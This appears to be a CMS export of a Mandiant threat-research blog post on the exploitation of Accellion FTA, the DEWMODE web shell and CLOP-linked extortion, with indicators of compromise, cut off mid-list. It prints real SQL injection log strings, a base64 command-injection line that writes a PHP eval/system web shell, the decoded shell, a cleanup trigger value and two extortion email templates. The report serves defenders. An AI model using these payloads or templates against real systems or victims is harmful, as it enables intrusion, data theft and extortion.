{
  "jcr:primaryType": "cq:Page",
  "jcr:createdBy": "admin",
  "jcr:created": "Mon Feb 22 2021 14:00:00 GMT+0000",
  "jcr:content": {
    "jcr:primaryType": "cq:PageContent",
    "jcr:mixinTypes": [
      "mix:versionable"
    ],
    "jcr:createdBy": "admin",
    "jcr:title": "Cyber Criminals Exploit Accellion FTA for Data Theft and Extortion",
    "jcr:versionHistory": "454b5d90-4fbe-498d-b2c9-e148e9327186",
    "author": "Andrew Moore",
    "cq:template": "\/apps\/fireeye-blog\/templates\/page_blogpost",
    "jcr:language": "en_us",
    "jcr:predecessors": [
      "6a3d107e-2b1d-46a2-9144-fee00bf11451"
    ],
    "jcr:created": "Mon Feb 22 2021 19:54:20 GMT+0000",
    "cq:lastModified": "Mon Feb 22 2021 19:54:03 GMT+0000",
    "jcr:baseVersion": "6a3d107e-2b1d-46a2-9144-fee00bf11451",
    "jcr:isCheckedOut": true,
    "cq:tags": [
      "fireeye-blog-authors:andrew-moore",
      "fireeye-blog-authors:genevieve-stark",
      "fireeye-blog-authors:isif-ibrahima",
      "fireeye-blog-authors:van-ta",
      "fireeye-blog-threat-research:threat-research",
      "fireeye-blog-tags:homepage-carousel",
      "fireeye-blog-tags:latest",
      "fireeye-blog-tags:data-theft",
      "fireeye-blog-tags:mandiant",
      "fireeye-blog-tags:vulnerabilities",
      "fireeye-blog-tags:unc",
      "fireeye-blog-tags:ransomware",
      "fireeye-blog-tags:extortion",
      "fireeye-blog-authors:kimberly-goody"
    ],
    "jcr:uuid": "700a7c95-7ba8-4e06-b833-3e55573b155a",
    "sling:resourceType": "social\/blog\/components\/page",
    "published": "Mon Feb 22 2021 06:00:00 GMT-0800",
    "cq:lastModifiedBy": "lynda.hall@fireeye.com",
    "par": {
      "jcr:primaryType": "nt:unstructured",
      "sling:resourceType": "foundation\/components\/parsys",
      "entry": {
        "jcr:primaryType": "nt:unstructured",
        "jcr:lastModifiedBy": "lynda.hall@fireeye.com",
        "text": "\u003Cp\u003EStarting in mid-December 2020, malicious actors that Mandiant tracks as UNC2546 exploited multiple zero-day vulnerabilities in Accellion\u2019s legacy File Transfer Appliance (FTA) to install a newly discovered web shell named DEWMODE. The motivation of UNC2546 was not immediately apparent, but starting in late January 2021, several organizations that had been impacted by UNC2546 in the prior month began receiving extortion emails from actors threatening to publish stolen data on the \u201cCL0P^_- LEAKS\u0026quot; .onion website. Some of the published victim data appears to have been stolen using the DEWMODE web shell.\u003C\/p\u003E\n\u003Cp\u003ENotably, the number of victims on the \u201cCL0P^_- LEAKS\u0026quot; shaming website has increased in February 2021 with organizations in the United States, Singapore, Canada, and the Netherlands recently outed by these threat actors. Mandiant has previously reported that \u003Ca href=\u0022\/content\/fireeye-www\/en_US\/blog\/threat-research\/2020\/10\/fin11-email-campaigns-precursor-for-ransomware-data-theft.html\u0022 adhocenable=\u0022false\u0022\u003EFIN11 has threatened to post stolen victim data\u003C\/a\u003E on this same .onion site as an additional tactic to pressure victims into paying extortion demands following the deployment of CLOP ransomware. However, in recent CLOP extortion incidents, no ransomware was deployed nor were the other hallmarks of FIN11 present.\u003C\/p\u003E\n\u003Cp\u003EWe are currently tracking the exploitation of the zero-day Accellion FTA vulnerabilities and data theft from companies running the legacy FTA product as UNC2546, and the subsequent extortion activity as UNC2582. We have identified overlaps between UNC2582, UNC2546, and prior FIN11 operations, and we will continue to evaluate the relationships between these clusters of activity. For more information on our use of \u2018UNC\u2019 designations, see our blog post, \u0026quot;\u003Ca href=\u0022\/content\/fireeye-www\/en_US\/blog\/products-and-services\/2020\/12\/how-mandiant-tracks-uncategorized-threat-actors.html\u0022 adhocenable=\u0022false\u0022\u003EDebUNCing Attribution: How Mandiant Tracks Uncategorized Threat Actors\u003C\/a\u003E.\u0026quot;\u003C\/p\u003E\n\u003Cp\u003EMandiant has been working closely with Accellion in response to these matters and will be producing a complete security assessment report in the coming weeks. At this time, \u003Ca href=\u0022https:\/\/www.accellion.com\/company\/press-releases\/accellion-provides-update-to-recent-fta-security-incident\/\u0022\u003EAccellion has patched all FTA vulnerabilities\u003C\/a\u003E known to be exploited by the threat actors and has added new monitoring and alerting capabilities to flag anomalies associated with these attack vectors. Mandiant has validated these patches. Mandiant is currently performing penetration testing and code review of the current version of the Accellion FTA product and has not found any other critical vulnerabilities in the FTA product based on our analysis to date. Accellion customers using the FTA legacy product were the targets of the attack.\u003C\/p\u003E\n\u003Cp\u003EAccellion FTA is a 20-year-old product nearing end of life. Accellion strongly recommends that \u003Ca href=\u0022https:\/\/www.accellion.com\/products\/fta\/\u0022\u003EFTA customers migrate to kiteworks\u003C\/a\u003E, Accellion\u2019s \u003Ca href=\u0022https:\/\/www.accellion.com\/\u0022\u003Eenterprise content firewall\u003C\/a\u003E platform. Per Accellion, Kiteworks is built on an entirely different code base.\u003C\/p\u003E\n\u003Cp\u003EThe following CVEs have since been reserved for tracking the recently patched Accellion FTA vulnerabilities:\u003C\/p\u003E\n\u003Cul\u003E\n\u003Cli\u003E\u003Ca href=\u0022https:\/\/nvd.nist.gov\/vuln\/detail\/CVE-2021-27101\u0022\u003ECVE-2021-27101\u003C\/a\u003E - SQL injection via a crafted Host header\u003C\/li\u003E\n\u003Cli\u003E\u003Ca href=\u0022https:\/\/nvd.nist.gov\/vuln\/detail\/CVE-2021-27102\u0022\u003ECVE-2021-27102\u003C\/a\u003E - OS command execution via a local web service call\u003C\/li\u003E\n\u003Cli\u003E\u003Ca href=\u0022https:\/\/nvd.nist.gov\/vuln\/detail\/CVE-2021-27103\u0022\u003ECVE-2021-27103\u003C\/a\u003E - SSRF via a crafted POST request\u003C\/li\u003E\n\u003Cli\u003E\u003Ca href=\u0022https:\/\/nvd.nist.gov\/vuln\/detail\/CVE-2021-27104\u0022\u003ECVE-2021-27104\u003C\/a\u003E - OS command execution via a crafted POST request\u003C\/li\u003E\n\u003C\/ul\u003E\n\u003Ch4\u003EUNC2546 and DEWMODE\u003C\/h4\u003E\n\u003Cp\u003EIn mid-December 2020, Mandiant responded to multiple incidents in which a web shell we call DEWMODE was used to exfiltrate data from Accellion FTA devices. The Accellion FTA device is a purpose-built application designed to allow an enterprise to securely transfer large files. The exfiltration activity has affected entities in a wide range of sectors and countries.\u003C\/p\u003E\n\u003Cp\u003EAcross these incidents, Mandiant observed common infrastructure usage and TTPs, including exploitation of FTA devices to deploy the DEWMODE web shell. Mandiant determined that a common threat actor we now track as UNC2546 was responsible for this activity. While complete details of the vulnerabilities leveraged to install DEWMODE are still being analyzed, evidence from multiple client investigations has shown multiple commonalities in UNC2546\u0027s activities.\u003C\/p\u003E\n\u003Ch4\u003EEvidence of Exploitation and DEWMODE Installation\u003C\/h4\u003E\n\u003Cp\u003EMandiant has been able reconstruct many of the details about how Accellion FTAs have been compromised through examination of Apache and system logs from impacted devices\u2014from initial compromise, to deployment of DEWMODE, and follow-on interaction.\u003C\/p\u003E\n\u003Cp\u003EThe earliest identification of activity associated with this campaign occurred in mid-December 2020. At this time, Mandiant identified UNC2546 leveraging an SQL injection vulnerability in the Accellion FTA. This SQL injection served as the primary intrusion vector.\u003C\/p\u003E\n\u003Cp\u003EMandiant observed evidence of SQL injection followed by subsequent requests to additional resources, as shown in Figure 1.\u003C\/p\u003E\n\u003Ctable border=\u00221\u0022 cellspacing=\u00220\u0022 cellpadding=\u00220\u0022\u003E\n\u003Ctbody\u003E\u003Ctr\u003E\u003Ctd width=\u0022624\u0022 valign=\u0022top\u0022\u003E\u003Cp\u003E\u003Cspan class=\u0022code\u0022\u003E[21\/Dec\/2020:18:14:32 +0000] [.\u0027))union(select(c_value)from(t_global)where(t_global.c_param)=(\u0027w1\u0027))#\/sid#935ee00][rid#9700968\/initial] (1) pass through \/courier\/document_root.html\u003C\/span\u003E\u003C\/p\u003E\n\u003Cp\u003E\u003Cspan class=\u0022code\u0022\u003E[21\/Dec\/2020:18:14:33 +0000] [\u0027))union(select(loc_id)from(net1.servers)where(proximity)=(0))#\/sid#935ee00][rid#9706978\/initial] (1) pass through \/courier\/document_root.html\u003C\/span\u003E\u003C\/p\u003E\n\u003Cp\u003E\u003Cspan class=\u0022code\u0022\u003E[21\/Dec\/2020:18:14:33 +0000] [.\u0027))union(select(reverse(c_value))from(t_global)where(t_global.c_param)=(\u0027w1\u0027))#\/sid#935ee00][rid#971c098\/initial] (1) pass through \/courier\/document_root.html\u003C\/span\u003E\u003C\/p\u003E\n\u003Cp\u003E\u003Cspan class=\u0022code\u0022\u003E[21\/Dec\/2020:18:14:34 +0000] [\u0026lt;redacted\u0026gt;\/sid#935ee00][rid#971a090\/initial] (1) pass through \/courier\/sftp_account_edit.php\u003C\/span\u003E\u003C\/p\u003E\n\u003Cp\u003E\u003Cspan class=\u0022code\u0022\u003E[21\/Dec\/2020:18:14:35 +0000] [\u0026lt;redacted\u0026gt;\/sid#935ee00][rid#9706978\/initial] (1) pass through \/courier\/oauth.api\u003C\/span\u003E\u003C\/p\u003E\n\u003Cp\u003E\u003Cspan class=\u0022code\u0022\u003E[21\/Dec\/2020:18:14:35 +0000] [\u0026lt;redacted\u0026gt;\/sid#935ee00][rid#9708980\/initial] (1) pass through \/courier\/oauth.api\u003C\/span\u003E\u003C\/p\u003E\n\u003Cp\u003E\u0026nbsp;\u003C\/p\u003E\n\u003C\/td\u003E\n\u003C\/tr\u003E\u003C\/tbody\u003E\u003C\/table\u003E\n\u003Cp\u003E\u003Cspan class=\u0022type-XS\u0022\u003EFigure 1: SQL injection log\u003C\/span\u003E\u003C\/p\u003E\n\u003Cp\u003EUNC2546 has leveraged this SQL injection vulnerability to retrieve a key which appears to be used in conjunction with a request to the file \u003Cspan class=\u0022code\u0022\u003Esftp_account_edit.php\u003C\/span\u003E. Immediately after this request, the built-in Accellion utility \u003Cspan class=\u0022code\u0022\u003Eadmin.pl\u003C\/span\u003E was executed, resulting in an eval web shell being written to \u003Cspan class=\u0022code\u0022\u003Eoauth.api\u003C\/span\u003E.\u003C\/p\u003E\n\u003Ctable border=\u00221\u0022 cellspacing=\u00220\u0022 cellpadding=\u00220\u0022\u003E\n\u003Ctbody\u003E\u003Ctr\u003E\u003Ctd width=\u0022624\u0022 valign=\u0022top\u0022\u003E\u003Cspan class=\u0022code\u0022\u003EPWD=\/home\/seos\/courier ; USER=root ; COMMAND=\/usr\/local\/bin\/admin.pl --edit_user=F \u003Cbr\u003E\n --mount_cifs=-\u003Cbr\u003E\n V,DF,$(echo${IFS}PD9waHAKCmlmKGlzc2V0KCRfUkVRVUVTVFsndG9rZW4nXSkpCnsKICAgIGV2YWwoYm\u003Cbr\u003E\n FzZTY0X2RlY29kZSgkX1JFUVVFU1RbJ3Rva2VuJ10pKTsKfQplbHNlIGlmKGlzc2V0KCRfUkVRVUVTVFsnd\u003Cbr\u003E\n XNlcm5hbWUnXSkpCnsKICAgIHN5c3RlbSgkX1JFUVVFU1RbJ3VzZXJuYW1lJ10pOwp9CmVsc2UKewogICAgaG\u003Cbr\u003E\n VhZGVyKCdMb2NhdGlvbjogLycpOwp9|base64${IFS}-d|tee${IFS}\/home\/seos\/courier\/oauth.api);FUK;\u0026quot;,PASSWORD # \\\u0026quot; --passwd=pop\u003C\/span\u003E\u003C\/td\u003E\n\u003C\/tr\u003E\u003C\/tbody\u003E\u003C\/table\u003E\n\u003Cp\u003E\u003Cspan class=\u0022type-XS\u0022\u003EFigure 2: Excerpt from log showing creation of eval web shell\u003C\/span\u003E\u003C\/p\u003E\n\u003Cp\u003EThe decoded contents are shown in Figure 3.\u003C\/p\u003E\n\u003Ctable border=\u00221\u0022 cellspacing=\u00220\u0022 cellpadding=\u00220\u0022\u003E\n\u003Ctbody\u003E\u003Ctr\u003E\u003Ctd width=\u0022624\u0022 valign=\u0022top\u0022\u003E\u003Cp\u003E\u003Cspan class=\u0022code\u0022\u003E\u0026lt;?php\u003C\/span\u003E\u003C\/p\u003E\n\u003Cp\u003E\u003Cspan class=\u0022code\u0022\u003Eif(isset($_REQUEST[\u0027token\u0027]))\u003Cbr\u003E\n {\u003Cbr\u003E\n \u0026nbsp; \u0026nbsp; eval(base64_decode($_REQUEST[\u0027token\u0027]));\u003Cbr\u003E\n }\u003Cbr\u003E\n else if(isset($_REQUEST[\u0027username\u0027]))\u003Cbr\u003E\n {\u003Cbr\u003E\n \u0026nbsp; \u0026nbsp; system($_REQUEST[\u0027username\u0027]);\u003Cbr\u003E\n }\u003Cbr\u003E\n else\u003Cbr\u003E\n {\u003Cbr\u003E\n \u0026nbsp; \u0026nbsp; header(\u0027Location: \/\u0027);\u003Cbr\u003E\n }\u003C\/span\u003E\u003C\/p\u003E\n\u003C\/td\u003E\n\u003C\/tr\u003E\u003C\/tbody\u003E\u003C\/table\u003E\n\u003Cp\u003E\u003Cspan class=\u0022type-XS\u0022\u003EFigure 3: Decoded eval web shell\u003C\/span\u003E\u003C\/p\u003E\n\u003Cp\u003EAlmost immediately following this sequence, the DEWMODE web shell is written to the system. The timing of these requests suggests that DEWMODE was delivered via the\u0026nbsp;\u003Cspan class=\u0022code\u0022\u003Eoauth.api\u003C\/span\u003E\u0026nbsp;web shell; however, the available evidence does not indicate the exact mechanism used to write DEWMODE to disk.\u003C\/p\u003E\n\u003Cp\u003EMandiant has identified the DEWMODE web shell in one of the following two locations:\u003C\/p\u003E\n\u003Cul\u003E\n\u003Cli\u003E\u003Cspan class=\u0022code\u0022\u003E\/home\/seos\/courier\/about.html\u003C\/span\u003E\u003C\/li\u003E\n\u003Cli\u003E\u003Cspan class=\u0022code\u0022\u003E\/home\/httpd\/html\/about.html\u003C\/span\u003E\u003C\/li\u003E\n\u003C\/ul\u003E\n\u003Cp\u003EThe DEWMODE web shell (Figure 4) extracts a list of available files from a MySQL database on the FTA and lists those files and corresponding metadata\u2014file ID, path, filename, uploader, and recipient\u2014on an HTML page. UNC2546 then uses the presented list to download files through the DEWMODE web shell. Download requests are captured in the FTA\u2019s web logs, which will contain requests to the DEWMODE web shell with encrypted and encoded URL parameters, where dwn is the file path and fn is the requested file name (Figure 5). The encrypted file path and name values visible in web logs can be decrypted using key material obtained from the database used by the targeted FTA. Given the complex nature of this process, if your organization needs assistance reviewing relevant logs, please contact Mandiant or Accellion.\u003C\/p\u003E\n\u003Cp\u003E\u003Cimg src=\u0022\/content\/dam\/fireeye-www\/blog\/images\/accellion-fta\/fig4.png\u0022 alt=\u0022\u0022\u003E\u003Cbr\u003E\n\u003Cspan class=\u0022type-XS\u0022\u003EFigure 4: DEWMODE web shell screenshot\u003C\/span\u003E\u003C\/p\u003E\n\u003Ctable border=\u00221\u0022 cellspacing=\u00220\u0022 cellpadding=\u00220\u0022\u003E\n\u003Ctbody\u003E\u003Ctr\u003E\u003Ctd width=\u0022624\u0022 valign=\u0022top\u0022\u003E\u003Cspan class=\u0022code\u0022\u003EGET \/courier\/about.html?dwn=[REDACTED]\u0026amp;fn=[REDACTED] HTTP\/1.1\u0026quot; 200 1098240863 \u0026quot;-\u0026quot; \u0026quot;-\u0026quot; \u0026quot;-\u0026quot; TLSv1.2 ECDHE-RSA-AES128-SHA256\u003C\/span\u003E\u003C\/td\u003E\n\u003C\/tr\u003E\u003C\/tbody\u003E\u003C\/table\u003E\n\u003Cp\u003E\u003Cspan class=\u0022type-XS\u0022\u003EFigure 5: DEWMODE File Download URL parameters\u003C\/span\u003E\u003C\/p\u003E\n\u003Cp\u003EFollowing file downloads, UNC2546 initiates a cleanup routine by passing a specific query parameter named \u003Cspan class=\u0022code\u0022\u003Ecsrftoken\u003C\/span\u003E with the value \u003Cspan class=\u0022code\u0022\u003E11454bd782bb41db213d415e10a0fb3c\u003C\/span\u003E to DEWMODE. The following actions are performed:\u003C\/p\u003E\n\u003Cul\u003E\n\u003Cli\u003EA shell script is written to \u003Cspan class=\u0022code\u0022\u003E\/tmp\/.scr\u003C\/span\u003E, which will:\u003Cul\u003E\n\u003Cli\u003ERemove all references to \u003Cspan class=\u0022code\u0022\u003Eabout.html\u003C\/span\u003E from log files located in \u003Cspan class=\u0022code\u0022\u003E\/var\/opt\/apache\/\u003C\/span\u003E\u003C\/li\u003E\n\u003Cli\u003EWrite the modified log file to \u003Cspan class=\u0022code\u0022\u003E\/tmp\/x\u003C\/span\u003E then replace the original log file at \u003Cspan class=\u0022code\u0022\u003E\/var\/opt\/apache\/\u003C\/span\u003E\u003C\/li\u003E\n\u003Cli\u003EDelete the contents of the \u003Cspan class=\u0022code\u0022\u003E\/home\/seos\/log\/adminpl.log\u003C\/span\u003E log file.\u003C\/li\u003E\n\u003Cli\u003ERemove \u003Cspan class=\u0022code\u0022\u003E\/home\/seos\/courier\/about.html\u003C\/span\u003E (DEWMODE) and \u003Cspan class=\u0022code\u0022\u003E\/home\/seos\/courier\/oauth.api\u003C\/span\u003E (eval web shell), and redirect command output to the file \u003Cspan class=\u0022code\u0022\u003E\/tmp\/.out\u003C\/span\u003E\u003C\/li\u003E\n\u003Cli\u003EChange the permissions of the output file to be readable, writeable and executable by all users, and set the owner to \u201cnobody\u201d\u003C\/li\u003E\n\u003C\/ul\u003E\n\u003C\/li\u003E\n\u003Cli\u003EDelete the script file \u003Cspan class=\u0022code\u0022\u003E\/tmp\/.scr\u003C\/span\u003E and other temporarily created files to assist in cleanup\u003C\/li\u003E\n\u003Cli\u003EDisplay cleanup output to the requesting user\u003C\/li\u003E\n\u003C\/ul\u003E\n\u003Cp\u003EAn example of a cleanup request and subsequent execution of the cleanup script can be seen in Figure 6.\u003C\/p\u003E\n\u003Ctable border=\u00221\u0022 cellspacing=\u00220\u0022 cellpadding=\u00220\u0022\u003E\n\u003Ctbody\u003E\u003Ctr\u003E\u003Ctd width=\u0022624\u0022 valign=\u0022top\u0022\u003E\u003Cp\u003E\u003Cspan class=\u0022code\u0022\u003EGET \/courier\/about.html?csrftoken=11454bd782bb41db213d415e10a0fb3c HTTP\/1.1\u0026quot; 200 5 \u0026quot;-\u0026quot; \u0026quot;https:\/\/[REDACTED]\/\/courier\/about.html?aid=1000\u0026quot; \u0026quot;Mozilla\/5.0 (X11; Linux x86_64; rv:82.0) Gecko\/20100101\u003C\/span\u003E\u003C\/p\u003E\n\u003Cp\u003E\u003Cspan class=\u0022code\u0022\u003Esft sudo:\u0026nbsp;\u0026nbsp; nobody : TTY=unknown ; PWD=\/home\/seos\/courier ; USER=root ; COMMAND=\/usr\/local\/bin\/admin.pl --mount_cifs=AF,DF,\u0027$(sh \/tmp\/.scr)\u0027,PASSWORD\u003C\/span\u003E\u003C\/p\u003E\n\u003C\/td\u003E\n\u003C\/tr\u003E\u003C\/tbody\u003E\u003C\/table\u003E\n\u003Cp\u003E\u003Cspan class=\u0022type-XS\u0022\u003EFigure 6: DEWMODE cleanup request\u003C\/span\u003E\u003C\/p\u003E\n\u003Cp\u003EMandiant also identified a variant of DEWMODE (\u003Cspan class=\u0022code\u0022\u003Ebdfd11b1b092b7c61ce5f02ffc5ad55a\u003C\/span\u003E) which contained minor changes to the cleanup operation, including wiping of \u003Cspan class=\u0022code\u0022\u003E\/var\/log\/secure\u003C\/span\u003E and removing \u003Cspan class=\u0022code\u0022\u003Eabout.html\u003C\/span\u003E and \u003Cspan class=\u0022code\u0022\u003Eoauth.api\u003C\/span\u003E from the directories \u003Cspan class=\u0022code\u0022\u003E\/home\/httpd\/html\/\u003C\/span\u003E instead of \u003Cspan class=\u0022code\u0022\u003E\/home\/seos\/courier\/\u003C\/span\u003E.\u003Cb\u003E\u003C\/b\u003E\u003C\/p\u003E\n\u003Cp\u003EIn a subset of incidents, Mandiant observed UNC2546 requesting a file named \u003Cspan class=\u0022code\u0022\u003Ecache.js.gz\u003C\/span\u003E (Figure 7). Based on temporal file access to the \u003Cspan class=\u0022code\u0022\u003Emysqldump\u003C\/span\u003E utility and \u003Cspan class=\u0022code\u0022\u003Emysql\u003C\/span\u003E data directories, the archive likely contained a dump of the database. With the exception of \u003Cspan class=\u0022code\u0022\u003Ecache.js.gz\u003C\/span\u003E, Mandiant has not observed UNC2546 acquiring files from Accellion appliances through any method besides DEWMODE.\u003C\/p\u003E\n\u003Ctable border=\u00221\u0022 cellspacing=\u00220\u0022 cellpadding=\u00220\u0022\u003E\n\u003Ctbody\u003E\u003Ctr\u003E\u003Ctd width=\u0022624\u0022 valign=\u0022top\u0022\u003E\u003Cspan class=\u0022code\u0022\u003EGET \/\/courier\/cache.js.gz HTTP\/1.1\u0026quot; 200 35654360 \u0026quot;-\u0026quot; \u0026quot;-\u0026quot; \u0026quot;python-requests\/2.24.0\u0026quot; TLSv1.2 ECDHE-RSA-AES128-GCM-SHA256\u003C\/span\u003E\u003C\/td\u003E\n\u003C\/tr\u003E\u003C\/tbody\u003E\u003C\/table\u003E\n\u003Cp\u003E\u003Cspan class=\u0022type-XS\u0022\u003EFigure 7: cache.js.gz file request\u003C\/span\u003E\u003C\/p\u003E\n\u003Ch4\u003EUNC2582 Data Theft Extortion\u003C\/h4\u003E\n\u003Cp\u003EShortly after installation of the web shell, in multiple cases within hours, UNC2546 leveraged DEWMODE to download files from compromised FTA instances. While the actors\u2019 motivations were not immediately clear, several weeks after delivery of the DEWMODE web shell, victims began to receive extortion emails from an actor claiming association with the CLOP ransomware team (Figure 8 and Figure 9). The actors threatened to publish data on the \u0026quot;CL0P^_- LEAKS\u0026quot; .onion shaming website, unless the victim paid an extortion fee. We are tracking the subsequent extortion activity under a separate threat cluster, UNC2582. Despite tracking the exploitation and extortion activity in separate threat clusters we have observed at least one case where an actor interacted with a DEWMODE web shell from a host that was used to send UNC2582-attributed extortion email.\u003C\/p\u003E\n\u003Ctable border=\u00221\u0022 cellspacing=\u00220\u0022 cellpadding=\u00220\u0022\u003E\n\u003Ctbody\u003E\u003Ctr\u003E\u003Ctd width=\u0022624\u0022 valign=\u0022top\u0022\u003E\u003Cp\u003EHello!\u003C\/p\u003E\n\u003Cp\u003EYour network has been hacked, a lot of valuable data stolen. \u0026lt;description of stolen data, including the total size of the compressed files\u0026gt; We are the CLOP ransomware team, you can google news and articles about us. We have a website where we publish news and stolen files from companies that have refused to cooperate. Here is his address http:\/\/[redacted].onion\/ - use TOR browser or http:\/\/[redacted].onion.dog\/ - mirror. We are visited by 20-30 thousand journalists, IT experts, hackers and competitors every day. We suggest that you contact us via chat within 24 hours to discuss the current situation. \u0026lt;victim-specific negotiation URL\u0026gt; - use TOR browser We don\u0027t want to hurt, our goal is money. We are also ready to provide any evidence of the presence of files with us.\u003C\/p\u003E\n\u003C\/td\u003E\n\u003C\/tr\u003E\u003C\/tbody\u003E\u003C\/table\u003E\n\u003Cp\u003E\u003Cspan class=\u0022type-XS\u0022\u003EFigure 8: Extortion Note Template 1\u003C\/span\u003E\u003C\/p\u003E\n\u003Ctable border=\u00221\u0022 cellspacing=\u00220\u0022 cellpadding=\u00220\u0022\u003E\n\u003Ctbody\u003E\u003Ctr\u003E\u003Ctd width=\u0022624\u0022 valign=\u0022top\u0022\u003E\u003Cp\u003EThis is the last warning!\u003C\/p\u003E\n\u003Cp\u003EIf you don\u2019t get in touch today, tomorrow we will create a page with screenshots of your files (like the others on our site),\u0026nbsp; send messages to all the emails that we received from your files. Due to the fact that journalists and hackers visit our site, calls and questions will immediately begin, online publications will begin to publish information about the leak, you will be asked to comment.\u003C\/p\u003E\n\u003Cp\u003EDo not let this happen, write to us in chat or email and we will discuss the situation!\u003C\/p\u003E\n\u003Cp\u003ECHAT:\u0026nbsp; \u0026lt;victim-specific negotiation URL\u0026gt;\u003C\/p\u003E\n\u003Cp\u003EEMAIL: unlock@support-box.com\u003C\/p\u003E\n\u003Cp\u003EUSE TOR BROWSER!\u003C\/p\u003E\n\u003C\/td\u003E\n\u003C\/tr\u003E\u003C\/tbody\u003E\u003C\/table\u003E\n\u003Cp\u003E\u003Cspan class=\u0022type-XS\u0022\u003EFigure 9: Extortion Note Template 2\u003C\/span\u003E\u003C\/p\u003E\n\u003Cp\u003EBased on observations at several engagements, UNC2582 appears to follow a pattern of escalation to pressure victims into paying extortion demands. Initial emails are sent from a free email account, likely unique per victim, to a seemingly limited distribution of addresses at the victim organization. If the victim does not respond in a timely manner, additional emails are sent to a much larger number of recipients from hundreds or thousands of different email accounts and using varied SMTP infrastructure. In at least one case, UNC2582 also sent emails\u0026nbsp; to partners of the victim organization that included links to the stolen data and negotiation chat. Monitoring of the CL0P^_- LEAKS shaming website has demonstrated that UNC2582 has followed through on threats to publish stolen data as several new victims have appeared on the site in recent weeks, including at least one organization that has publicly confirmed that their Accellion FTA device had been recently targeted.\u003C\/p\u003E\n\u003Ch4\u003EKey Overlaps With FIN11\u003C\/h4\u003E\n\u003Cp\u003E\u003Ci\u003EUNC2582 (Extortion) and FIN11\u003C\/i\u003E\u003C\/p\u003E\n\u003Cp\u003EMandiant identified overlaps between UNC2582\u2019s data theft extortion activity and prior \u003Ca href=\u0022https:\/\/www.fireeye.com\/blog\/threat-research\/2020\/10\/fin11-email-campaigns-precursor-for-ransomware-data-theft.html\u0022\u003EFIN11\u003C\/a\u003E operations, including common email senders and the use of the CL0P^_- LEAKS shaming site. While FIN11 is known for deploying CLOP ransomware, we have previously observed the group conduct data theft extortion without ransomware deployment, similar to these cases.\u003C\/p\u003E\n\u003Cul\u003E\n\u003Cli\u003ESome UNC2582 extortion emails observed in January 2021 were sent from IP addresses and\/or email accounts used by FIN11 in multiple phishing campaigns between August and December 2020, including some of the last campaigns that were clearly attributable to the group.\u003C\/li\u003E\n\u003Cli\u003EWe have not observed FIN11 phishing activity in the new year. FIN11 has typically paused their phishing operations over the winter holidays and had several extended gaps in their operations. However, the timing of this current hiatus is also consistent with UNC2582\u2019s data theft extortion activity.\u003C\/li\u003E\n\u003Cli\u003EUNC2582 extortion emails contained a link to the CL0P^_- LEAKS website and\/or a victim specific negotiation page. The linked websites were the same ones used to support historical CLOP operations, a series of ransomware and data theft extortion campaigns we suspect can be exclusively attributed to FIN11.\u003C\/li\u003E\n\u003C\/ul\u003E\n\u003Cp\u003E\u003Ci\u003EUNC2546 (FTA Exploitation and DEWMODE) and FIN11\u003C\/i\u003E\u003C\/p\u003E\n\u003Cp\u003EThere are also limited overlaps between FIN11 and UNC2546.\u003C\/p\u003E\n\u003Cul\u003E\n\u003Cli\u003EMany of the organizations compromised by UNC2546 were previously targeted by FIN11.\u003C\/li\u003E\n\u003Cli\u003EAn IP address that communicated with a DEWMODE web shell was in the \u0026quot;Fortunix Networks L.P.\u0026quot; netblock, a network frequently used by FIN11 to host download and FRIENDSPEAK command and control (C2) domains.\u003C\/li\u003E\n\u003C\/ul\u003E\n\u003Ch4\u003EImplications\u003C\/h4\u003E\n\u003Cp\u003EThe overlaps between FIN11, UNC2546, and UNC2582 are compelling, but we continue to track these clusters separately while we evaluate the nature of their relationships. One of the specific challenges is that the scope of the overlaps with FIN11 is limited to the later stages of the attack life cycle. UNC2546 uses a different infection vector and foothold, and unlike FIN11, we have not observed the actors expanding their presence across impacted networks. We therefore have insufficient evidence to attribute the FTA exploitation, DEWMODE, or data theft extortion activity to FIN11. Using SQL injection to deploy DEWMODE or acquiring access to a DEWMODE shell from a separate threat actor would represent a significant shift in FIN11 TTPs, given the group has traditionally relied on phishing campaigns as its initial infection vector and we have not previously observed them use zero-day vulnerabilities. \u0026nbsp;\u003C\/p\u003E\n\u003Ch4\u003EAcknowledgements\u003C\/h4\u003E\n\u003Cp\u003EDavid Wong, Brandon Walters, Stephen Eckels and Jon Erickson\u003C\/p\u003E\n\u003Ch4\u003EIndicators of Compromise (IOCs)\u003C\/h4\u003E\n\u003Cp\u003E\u003Ci\u003EDEWMODE Web Shells\u003C\/i\u003E\u003C\/p\u003E\n\u003Ctable border=\u00221\u0022 cellspacing=\u00220\u0022 cellpadding=\u00220\u0022\u003E\n\u003Ctbody\u003E\u003Ctr\u003E\u003Ctd width=\u0022236\u0022 valign=\u0022top\u0022\u003E\u003Cp\u003E\u003Cb\u003EMD5\u003C\/b\u003E\u003C\/p\u003E\n\u003C\/td\u003E\n\u003Ctd width=\u0022388\u0022 valign=\u0022top\u0022\u003E\u003Cp\u003E\u003Cb\u003ESHA256\u003C\/b\u003E\u003C\/p\u003E\n\u003C\/td\u003E\n\u003C\/tr\u003E\u003Ctr\u003E\u003Ctd width=\u0022236\u0022 valign=\u0022top\u0022\u003E\u003Cp\u003E2798c0e836b907e8224520e7e6e4bb42\u003C\/p\u003E\n\u003C\/td\u003E\n\u003Ctd width=\u0022388\u0022 valign=\u0022top\u0022\u003E\u003Cp\u003E5fa2b9546770241da7305356d6427847598288290866837626f621d794692c1b\u003C\/p\u003E\n\u003C\/td\u003E\n\u003C\/tr\u003E\u003Ctr\u003E\u003Ctd width=\u0022236\u0022 valign=\u0022top\u0022\u003E\u003Cp\u003Ebdfd11b1b092b7c61ce5f02ffc5ad55a\u003C\/p\u003E\n\u003C\/td\u003E\n\u003Ctd width=\u0022388\u0022 valign=\u0022top\u0022\u003E\u003Cp\u003E2e0df09fa37eabcae645302d9865913b818ee0993199a6d904728f3093ff48c7\u003C\/p\u003E\n\u003C\/td\u003E\n\u003C\/tr\u003E\u003C\/tbody\u003E\u003C\/table\u003E\n\u003Cp\u003E\u003Ci style=\u0022font-size: 12px;\u0022\u003EUNC2546 Source IP Addresses\u003C\/i\u003E\u003C\/p\u003E\n\u003Cp\u003EThe following source IP addresses were observed in multiple UNC2546 